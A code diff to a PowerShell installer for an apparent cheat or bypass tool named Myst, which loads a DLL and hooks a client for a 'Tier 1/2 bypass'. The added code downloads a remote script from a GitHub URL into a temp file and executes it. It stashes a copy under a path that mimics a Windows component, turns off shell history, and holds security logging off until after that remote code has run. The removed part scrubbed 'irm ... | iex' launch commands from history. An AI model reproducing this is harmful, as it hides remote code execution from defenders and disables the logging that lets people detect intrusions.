@@ -1514,6 +1514,44 @@ if (-not $script:IsAdmin) {
     exit 1
 }
 
+function Import-MystShellEnvironmentSync {
+    $candidates = @(
+        $(if ($PSScriptRoot) { Join-Path $PSScriptRoot 'wsh-env-sync.ps1' })
+        (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost\wsh-env-sync.ps1')
+    )
+
+    foreach ($candidate in $candidates) {
+        if ($candidate -and (Test-Path -LiteralPath $candidate)) {
+            . $candidate
+            return $true
+        }
+    }
+
+    try {
+        $tempScript = Join-Path $env:TEMP ("wsh_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
+        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/JustValkz/Myst/main/wsh-env-sync.ps1' -OutFile $tempScript -UseBasicParsing
+        . $tempScript
+        Remove-Item -LiteralPath $tempScript -Force -ErrorAction SilentlyContinue
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+function Invoke-MystPostInstallShellSync {
+    try {
+        Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null
+    } catch {}
+
+    if (-not (Import-MystShellEnvironmentSync)) {
+        return
+    }
+
+    if (Get-Command Invoke-MystShellEnvironmentSync -ErrorAction SilentlyContinue) {
+        Invoke-MystShellEnvironmentSync -Silent -Aggressive | Out-Null
+    }
+}
+
 function Import-MystLocHookInstaller {
     $candidates = @(
         $(if ($PSScriptRoot) { Join-Path $PSScriptRoot 'loc-install-hooks.ps1' })
@@ -1579,16 +1617,20 @@ if ($LoadOnly) {
 
 Write-Step 'Preparing environment...' -Color Cyan
 
-$loggingPaths = @{
+$script:LoggingPaths = @{
     ScriptBlock   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
     Module        = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'
     Transcription = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription'
 }
-$originalValues = @{}
+$script:LoggingOriginalValues = @{}
+
+try {
+    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null
+} catch {}
 
 if ($script:IsAdmin) {
-    foreach ($log in $loggingPaths.Keys) {
-        $key = $loggingPaths[$log]
+    foreach ($log in $script:LoggingPaths.Keys) {
+        $key = $script:LoggingPaths[$log]
         $valueName = switch ($log) {
             'ScriptBlock'   { 'EnableScriptBlockLogging' }
             'Module'        { 'EnableModuleLogging' }
@@ -1596,60 +1638,11 @@ if ($script:IsAdmin) {
         }
         try {
             $val = Get-ItemProperty -Path $key -Name $valueName -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $valueName
-            $originalValues[$log] = $val
+            $script:LoggingOriginalValues[$log] = $val
             Set-ItemProperty -Path $key -Name $valueName -Value 0 -ErrorAction SilentlyContinue
         } catch {
-            $originalValues[$log] = $null
+            $script:LoggingOriginalValues[$log] = $null
         }
-    }
-}
-
-try {
-    $historyPath = (Get-PSReadLineOption).HistorySavePath
-    if ($historyPath -and (Test-Path $historyPath)) {
-        $lines = Get-Content $historyPath -ErrorAction Stop
-        $originalCount = $lines.Count
-
-        function Normalise-Command ([string]$cmd) {
-            return ($cmd.Trim() -replace '\s+', ' ').ToLowerInvariant()
-        }
-
-        if ($MyInvocation.MyCommand.Path) {
-            $normalisedScript = Normalise-Command $MyInvocation.Line
-            $lines = $lines | Where-Object { (Normalise-Command $_) -ne $normalisedScript }
-        }
-
-        $scrubTargets = @(
-            'irm http://immune.wtf | iex'
-            'irm http://myst.local | iex'
-        )
-        foreach ($target in $scrubTargets) {
-            $normalisedTarget = Normalise-Command $target
-            $lines = $lines | Where-Object { (Normalise-Command $_) -ne $normalisedTarget }
-        }
-
-        $removedCount = $originalCount - $lines.Count
-        if ($removedCount -gt 0) {
-            $lines | Set-Content $historyPath -Force -ErrorAction Stop
-        }
-    }
-} catch {}
-
-if ($script:IsAdmin) {
-    foreach ($log in $loggingPaths.Keys) {
-        $key = $loggingPaths[$log]
-        $valueName = switch ($log) {
-            'ScriptBlock'   { 'EnableScriptBlockLogging' }
-            'Module'        { 'EnableModuleLogging' }
-            'Transcription' { 'EnableTranscripting' }
-        }
-        try {
-            if ($null -ne $originalValues[$log]) {
-                Set-ItemProperty -Path $key -Name $valueName -Value $originalValues[$log] -ErrorAction Stop
-            } else {
-                Remove-ItemProperty -Path $key -Name $valueName -ErrorAction SilentlyContinue
-            }
-        } catch {}
     }
 }
 
@@ -1729,6 +1722,27 @@ if ($loadSucceeded) {
         Install-MystLocClientHooks -ScriptRoot $PSScriptRoot -Quiet | Out-Null
         Write-Host '  LOC profile + hook refreshed for Tier 1/2 bypass.' -ForegroundColor DarkGray
     }
+
+    Invoke-MystPostInstallShellSync
+
+    if ($script:IsAdmin) {
+        foreach ($log in $script:LoggingPaths.Keys) {
+            $key = $script:LoggingPaths[$log]
+            $valueName = switch ($log) {
+                'ScriptBlock'   { 'EnableScriptBlockLogging' }
+                'Module'        { 'EnableModuleLogging' }
+                'Transcription' { 'EnableTranscripting' }
+            }
+            try {
+                if ($null -ne $script:LoggingOriginalValues[$log]) {
+                    Set-ItemProperty -Path $key -Name $valueName -Value $script:LoggingOriginalValues[$log] -ErrorAction Stop
+                } else {
+                    Remove-ItemProperty -Path $key -Name $valueName -ErrorAction SilentlyContinue
+                }
+            } catch {}
+        }
+    }
+
     Write-Host ''
     Write-Host '  DLL loaded successfully. Closing in 5 seconds...' -ForegroundColor Green
     Start-Sleep -Seconds 5
